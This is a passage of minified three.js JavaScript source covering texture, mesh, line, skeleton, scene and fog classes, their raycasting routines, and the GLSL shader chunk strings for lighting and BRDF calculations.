this.image},set:function(a){this.image=a}});THREE.CompressedTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.constructor=THREE.CompressedTexture;\nTHREE.DataTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==k?k:THREE.NearestFilter;this.minFilter=void 0!==l?l:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.constructor=THREE.DataTexture;\nTHREE.VideoTexture=function(a,b,c,d,e,f,g,h,k){function l(){requestAnimationFrame(l);a.readyState>=a.HAVE_CURRENT_DATA&&(n.needsUpdate=!0)}THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.generateMipmaps=!1;var n=this;l()};THREE.VideoTexture.prototype=Object.create(THREE.Texture.prototype);THREE.VideoTexture.prototype.constructor=THREE.VideoTexture;THREE.Group=function(){THREE.Object3D.call(this);this.type=\"Group\"};THREE.Group.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Group});\nTHREE.Points=function(a,b){THREE.Object3D.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.PointsMaterial({color:16777215*Math.random()})};\nTHREE.Points.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Points,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<n){var h=b.closestPointToPoint(a);h.applyMatrix4(k);var m=d.ray.origin.distanceTo(h);m<d.near||m>d.far||e.push({distance:m,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,k=this.matrixWorld,l=d.params.Points.threshold;\nnull===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(k);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(k);b.copy(d.ray).applyMatrix4(a);var l=l/((this.scale.x+this.scale.y+this.scale.z)/3),n=l*l,l=new THREE.Vector3;if(h instanceof THREE.BufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var m=p.array,p=0,q=m.length;p<q;p++){var r=m[p];l.fromArray(h,3*r);f(l,r)}else for(p=0,m=h.length/3;p<m;p++)l.fromArray(h,3*p),f(l,p)}else for(l=h.vertices,\np=0,m=l.length;p<m;p++)f(l[p],p)}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.Line=function(a,b,c){if(1===c)return console.warn(\"THREE.Line: parameter THREE.LinePieces no longer supported. Created THREE.LineSegments instead.\"),new THREE.LineSegments(a,b);THREE.Object3D.call(this);this.type=\"Line\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.LineBasicMaterial({color:16777215*Math.random()})};\nTHREE.Line.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Line,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){var f=d.linePrecision,f=f*f,g=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var k=new THREE.Vector3,l=new THREE.Vector3,h=new THREE.Vector3,n=\nnew THREE.Vector3,p=this instanceof THREE.LineSegments?2:1;if(g instanceof THREE.BufferGeometry){var m=g.index,q=g.attributes.position.array;if(null!==m)for(var m=m.array,g=0,r=m.length-1;g<r;g+=p){var s=m[g+1];k.fromArray(q,3*m[g]);l.fromArray(q,3*s);s=b.distanceSqToSegment(k,l,n,h);s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,r=\nq.length/3-1;g<r;g+=p)k.fromArray(q,3*g),l.fromArray(q,3*g+3),s=b.distanceSqToSegment(k,l,n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g instanceof THREE.Geometry)for(k=g.vertices,l=k.length,g=0;g<l-1;g+=p)s=b.distanceSqToSegment(k[g],k[g+1],n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||\ne.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.LineSegments=function(a,b){THREE.Line.call(this,a,b);this.type=\"LineSegments\"};THREE.LineSegments.prototype=Object.assign(Object.create(THREE.Line.prototype),{constructor:THREE.LineSegments});\nTHREE.Mesh=function(a,b){THREE.Object3D.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.MeshBasicMaterial({color:16777215*Math.random()});this.drawMode=THREE.TrianglesDrawMode;this.updateMorphTargets()};\nTHREE.Mesh.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Mesh,setDrawMode:function(a){this.drawMode=a},copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){if(void 0!==this.geometry.morphTargets&&0<this.geometry.morphTargets.length){this.morphTargetBase=-1;this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var a=0,b=this.geometry.morphTargets.length;a<b;a++)this.morphTargetInfluences.push(0),\nthis.morphTargetDictionary[this.geometry.morphTargets[a].name]=a}},getMorphTargetIndexByName:function(a){if(void 0!==this.morphTargetDictionary[a])return this.morphTargetDictionary[a];console.warn(\"THREE.Mesh.getMorphTargetIndexByName: morph target \"+a+\" does not exist. Returning 0.\");return 0},raycast:function(){function a(a,b,c,d,e,g,f){THREE.Triangle.barycoordFromPoint(a,b,c,d,s);e.multiplyScalar(s.x);g.multiplyScalar(s.y);f.multiplyScalar(s.z);e.add(g).add(f);return e.clone()}function b(a,b,c,\nd,e,g,f){var h=a.material;if(null===(h.side===THREE.BackSide?c.intersectTriangle(g,e,d,!0,f):c.intersectTriangle(d,e,g,h.side!==THREE.DoubleSide,f)))return null;u.copy(f);u.applyMatrix4(a.matrixWorld);c=b.ray.origin.distanceTo(u);return c<b.near||c>b.far?null:{distance:c,point:u.clone(),object:a}}function c(c,d,e,f,l,p,n,s){g.fromArray(f,3*p);h.fromArray(f,3*n);k.fromArray(f,3*s);if(c=b(c,d,e,g,h,k,t))l&&(m.fromArray(l,2*p),q.fromArray(l,2*n),r.fromArray(l,2*s),c.uv=a(t,g,h,k,m,q,r)),c.face=new THREE.Face3(p,\nn,s,THREE.Triangle.normal(g,h,k)),c.faceIndex=p;return c}var d=new THREE.Matrix4,e=new THREE.Ray,f=new THREE.Sphere,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,l=new THREE.Vector3,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector2,q=new THREE.Vector2,r=new THREE.Vector2,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector3;return function(v,s){var w=this.geometry,u=this.material,z=this.matrixWorld;if(void 0!==u&&(null===w.boundingSphere&&w.computeBoundingSphere(),f.copy(w.boundingSphere),\nf.applyMatrix4(z),!1!==v.ray.intersectsSphere(f)&&(d.getInverse(z),e.copy(v.ray).applyMatrix4(d),null===w.boundingBox||!1!==e.intersectsBox(w.boundingBox)))){var y,A;if(w instanceof THREE.BufferGeometry){var I,B,u=w.index,z=w.attributes,w=z.position.array;void 0!==z.uv&&(y=z.uv.array);if(null!==u)for(var z=u.array,F=0,K=z.length;F<K;F+=3){if(u=z[F],I=z[F+1],B=z[F+2],A=c(this,v,e,w,y,u,I,B))A.faceIndex=Math.floor(F/3),s.push(A)}else for(F=0,K=w.length;F<K;F+=9)if(u=F/3,I=u+1,B=u+2,A=c(this,v,e,w,y,\nu,I,B))A.index=u,s.push(A)}else if(w instanceof THREE.Geometry){var P,M,z=u instanceof THREE.MultiMaterial,F=!0===z?u.materials:null,K=w.vertices;I=w.faces;B=w.faceVertexUvs[0];0<B.length&&(y=B);for(var H=0,L=I.length;H<L;H++){var O=I[H];A=!0===z?F[O.materialIndex]:u;if(void 0!==A){B=K[O.a];P=K[O.b];M=K[O.c];if(!0===A.morphTargets){A=w.morphTargets;var N=this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);k.set(0,0,0);for(var Q=0,J=A.length;Q<J;Q++){var D=N[Q];if(0!==D){var G=A[Q].vertices;g.addScaledVector(l.subVectors(G[O.a],\nB),D);h.addScaledVector(n.subVectors(G[O.b],P),D);k.addScaledVector(p.subVectors(G[O.c],M),D)}}g.add(B);h.add(P);k.add(M);B=g;P=h;M=k}if(A=b(this,v,e,B,P,M,t))y&&(N=y[H],m.copy(N[0]),q.copy(N[1]),r.copy(N[2]),A.uv=a(t,B,P,M,m,q,r)),A.face=O,A.faceIndex=H,s.push(A)}}}}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.Bone=function(a){THREE.Object3D.call(this);this.type=\"Bone\";this.skin=a};\nTHREE.Bone.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Bone,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.skin=a.skin;return this}});\nTHREE.Skeleton=function(a,b,c){this.useVertexTexture=void 0!==c?c:!0;this.identityMatrix=new THREE.Matrix4;a=a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=THREE.Math.nextPowerOfTwo(Math.ceil(a)),this.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new THREE.DataTexture(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,THREE.RGBAFormat,THREE.FloatType)):\nthis.boneMatrices=new Float32Array(16*this.bones.length);if(void 0===b)this.calculateInverses();else if(this.bones.length===b.length)this.boneInverses=b.slice(0);else for(console.warn(\"THREE.Skeleton bonInverses is the wrong length.\"),this.boneInverses=[],b=0,a=this.bones.length;b<a;b++)this.boneInverses.push(new THREE.Matrix4)};\nObject.assign(THREE.Skeleton.prototype,{calculateInverses:function(){this.boneInverses=[];for(var a=0,b=this.bones.length;a<b;a++){var c=new THREE.Matrix4;this.bones[a]&&c.getInverse(this.bones[a].matrixWorld);this.boneInverses.push(c)}},pose:function(){for(var a,b=0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent instanceof THREE.Bone?(a.matrix.getInverse(a.parent.matrixWorld),a.matrix.multiply(a.matrixWorld)):\na.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var a=new THREE.Matrix4;return function(){for(var b=0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:this.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return new THREE.Skeleton(this.bones,this.boneInverses,this.useVertexTexture)}});\nTHREE.SkinnedMesh=function(a,b,c){THREE.Mesh.call(this,a,b);this.type=\"SkinnedMesh\";this.bindMode=\"attached\";this.bindMatrix=new THREE.Matrix4;this.bindMatrixInverse=new THREE.Matrix4;a=[];if(this.geometry&&void 0!==this.geometry.bones){for(var d,e=0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new THREE.Bone(this),a.push(b),b.name=d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void 0!==d.scl&&b.scale.fromArray(d.scl);e=0;for(f=this.geometry.bones.length;e<f;++e)d=\nthis.geometry.bones[e],-1!==d.parent&&null!==d.parent&&void 0!==a[d.parent]?a[d.parent].add(a[e]):this.add(a[e])}this.normalizeSkinWeights();this.updateMatrixWorld(!0);this.bind(new THREE.Skeleton(a,void 0,c),this.matrixWorld)};\nTHREE.SkinnedMesh.prototype=Object.assign(Object.create(THREE.Mesh.prototype),{constructor:THREE.SkinnedMesh,bind:function(a,b){this.skeleton=a;void 0===b&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),b=this.matrixWorld);this.bindMatrix.copy(b);this.bindMatrixInverse.getInverse(b)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){if(this.geometry instanceof THREE.Geometry)for(var a=0;a<this.geometry.skinWeights.length;a++){var b=this.geometry.skinWeights[a],c=\n1/b.lengthManhattan();Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0)}else if(this.geometry instanceof THREE.BufferGeometry)for(var b=new THREE.Vector4,d=this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),b.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){THREE.Mesh.prototype.updateMatrixWorld.call(this,!0);\"attached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\n\"detached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\"THREE.SkinnedMesh unrecognized bindMode: \"+this.bindMode)},clone:function(){return(new this.constructor(this.geometry,this.material,this.skeleton.useVertexTexture)).copy(this)}});THREE.LOD=function(){THREE.Object3D.call(this);this.type=\"LOD\";Object.defineProperties(this,{levels:{enumerable:!0,value:[]}})};\nTHREE.LOD.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LOD,copy:function(a){THREE.Object3D.prototype.copy.call(this,a,!1);a=a.levels;for(var b=0,c=a.length;b<c;b++){var d=a[b];this.addLevel(d.object.clone(),d.distance)}return this},addLevel:function(a,b){void 0===b&&(b=0);b=Math.abs(b);for(var c=this.levels,d=0;d<c.length&&!(b<c[d].distance);d++);c.splice(d,0,{distance:b,object:a});this.add(a)},getObjectForDistance:function(a){for(var b=this.levels,c=1,d=b.length;c<\nd&&!(a<b[c].distance);c++);return b[c-1].object},raycast:function(){var a=new THREE.Vector3;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.origin.distanceTo(a);this.getObjectForDistance(d).raycast(b,c)}}(),update:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){var d=this.levels;if(1<d.length){a.setFromMatrixPosition(c.matrixWorld);b.setFromMatrixPosition(this.matrixWorld);c=a.distanceTo(b);d[0].object.visible=!0;for(var e=1,f=d.length;e<f;e++)if(c>=\nd[e].distance)d[e-1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.levels=[];for(var b=this.levels,c=0,d=b.length;c<d;c++){var e=b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return a}});THREE.Sprite=function(a){THREE.Object3D.call(this);this.type=\"Sprite\";this.material=void 0!==a?a:new THREE.SpriteMaterial};\nTHREE.Sprite.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Sprite,raycast:function(){var a=new THREE.Vector3;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.distanceSqToPoint(a);d>this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,face:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});\nTHREE.LensFlare=function(a,b,c,d,e){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)};\nTHREE.LensFlare.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LensFlare,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensFlares.push(a.lensFlares[b]);return this},add:function(a,b,c,d,e,f){void 0===b&&(b=-1);void 0===c&&(c=0);void 0===f&&(f=1);void 0===e&&(e=new THREE.Color(16777215));void 0===d&&(d=THREE.NormalBlending);\nc=Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var a,b=this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-c.rotation)}});\nTHREE.Scene=function(){THREE.Object3D.call(this);this.type=\"Scene\";this.overrideMaterial=this.fog=this.background=null;this.autoUpdate=!0};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);THREE.Scene.prototype.constructor=THREE.Scene;\nTHREE.Scene.prototype.copy=function(a,b){THREE.Object3D.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return this};THREE.Fog=function(a,b,c){this.name=\"\";this.color=new THREE.Color(a);this.near=void 0!==b?b:1;this.far=void 0!==c?c:1E3};\nTHREE.Fog.prototype.clone=function(){return new THREE.Fog(this.color.getHex(),this.near,this.far)};THREE.FogExp2=function(a,b){this.name=\"\";this.color=new THREE.Color(a);this.density=void 0!==b?b:2.5E-4};THREE.FogExp2.prototype.clone=function(){return new THREE.FogExp2(this.color.getHex(),this.density)};THREE.ShaderChunk={};THREE.ShaderChunk.alphamap_fragment=\"#ifdef USE_ALPHAMAP\\n\\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\\n#endif\\n\";THREE.ShaderChunk.alphamap_pars_fragment=\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\";\nTHREE.ShaderChunk.alphatest_fragment=\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\";THREE.ShaderChunk.aomap_fragment=\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.aomap_pars_fragment=\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\";THREE.ShaderChunk.begin_vertex=\"\\nvec3 transformed = vec3( position );\\n\";THREE.ShaderChunk.beginnormal_vertex=\"\\nvec3 objectNormal = vec3( normal );\\n\";THREE.ShaderChunk.bsdfs=\"bool testLightInRange( const in float lightDistance, const in float cutoffDistance ) {\\n\\treturn any( bvec2( cutoffDistance == 0.0, lightDistance < cutoffDistance ) );\\n}\\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 1.04 ) * a004 + r.zw;\\n\\treturn specularColor * AB.x + AB.y;\\n}\\nfloat G_BlinnPhong_Implicit( ) {\\n\\treturn 0.25;\\n}\\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\\n\\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\\n}\\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_BlinnPhong_Implicit( );\\n\\tfloat D = D_BlinnPhong( shininess, dotNH );\\n\\treturn F * ( G * D );\\n}\\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\\n\\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\\n}\\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\\n\\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\\n}\\n\";\nTHREE.ShaderChunk.bumpmap_pars_fragment=\"#ifdef USE_BUMPMAP\\n\\tuniform sampler2D bumpMap;\\n\\tuniform float bumpScale;\\n\\tvec2 dHdxy_fwd() {\\n\\t\\tvec2 dSTdx = dFdx( vUv );\\n\\t\\tvec2 dSTdy = dFdy( vUv );\\n\\t\\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\\n\\t\\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\\n\\t\\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\\n\\t\\treturn vec2( dBx, dBy );\\n\\t}\\n\\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\\n\\t\\tvec3 vSigmaX = dFdx( surf_pos );\\n\\t\\tvec3 vSigmaY = dFdy( surf_pos );\\n\\t\\tvec3 vN = surf_norm;\\n\\t\\tvec3 R1 = cross( vSigmaY, vN );\\n\\t\\tvec3 R2 = cross( vN, vSigmaX );\\n\\t\\tfloat fDet = dot( vSigmaX, R1 );\\n\\t\\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\\n\\t\\treturn normalize( abs( fDet ) * surf_norm - vGrad );\\n\\t}\\n#endif\\n\";\nTHREE.ShaderChunk.clipping_planes_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\tfor ( int i = 0; i < NUM_CLIPPING_PLANES; ++ i ) {\\n\\t\\tvec4 plane = clippingPlanes[ i ];\\n\\t\\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\\n\\t}\\n#endif\\n\";THREE.ShaderChunk.clipping_planes_pars_fragment=\"#if NUM_CLIPPING_PLANES > 0\\n\\t#if ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\t\\tvarying vec3 vViewPosition;\\n\\t#endif\\n\\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\\n#endif\\n\";\nTHREE.ShaderChunk.clipping_planes_pars_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvarying vec3 vViewPosition;\\n#endif\\n\";THREE.ShaderChunk.clipping_planes_vertex=\"#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG )\\n\\tvViewPosition = - mvPosition.xyz;\\n#endif\\n\";THREE.ShaderChunk.color_fragment=\"#ifdef USE_COLOR\\n\\tdiffuseColor.rgb *= vColor;\\n#endif\";THREE.ShaderChunk.color_pars_fragment=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\\n\";\nTHREE.ShaderChunk.color_pars_vertex=\"#ifdef USE_COLOR\\n\\tvarying vec3 vColor;\\n#endif\";THREE.ShaderChunk.color_vertex=\"#ifdef USE_COLOR\\n\\tvColor.xyz = color.xyz;\\n#endif\";THREE.ShaderChunk.common=\"#define PI 3.14159265359\\n#define PI2 6.28318530718\\n#define RECIPROCAL_PI 0.31830988618\\n#define RECIPROCAL_PI2 0.15915494\\n#define LOG2 1.442695\\n#define EPSILON 1e-6\\n#define saturate(a) clamp( a, 0.0, 1.0 )\\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\\nfloat pow2( const in float x ) { return x*x; }\\nfloat pow3( const in float x ) { return x*x*x; }\\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\\nhighp float rand( const in vec2 uv ) {\\n\\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\\n\\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\\n\\treturn fract(sin(sn) * c);\\n}\\nstruct IncidentLight {\\n\\tvec3 color;\\n\\tvec3 direction;\\n\\tbool visible;\\n};\\nstruct ReflectedLight {\\n\\tvec3 directDiffuse;\\n\\tvec3 directSpecular;\\n\\tvec3 indirectDiffuse;\\n\\tvec3 indirectSpecular;\\n};\\nstruct GeometricContext {\\n\\tvec3 position;\\n\\tvec3 normal;\\n\\tvec3 viewDir;\\n};\\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\\n}\\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\\n\\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\\n}\\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\tfloat distance = dot( planeNormal, point - pointOnPlane );\\n\\treturn - distance * planeNormal + point;\\n}\\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn sign( dot( point - pointOnPlane, planeNormal ) );\\n}\\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\\n\\treturn lineDirection * ( dot( planeNormal, 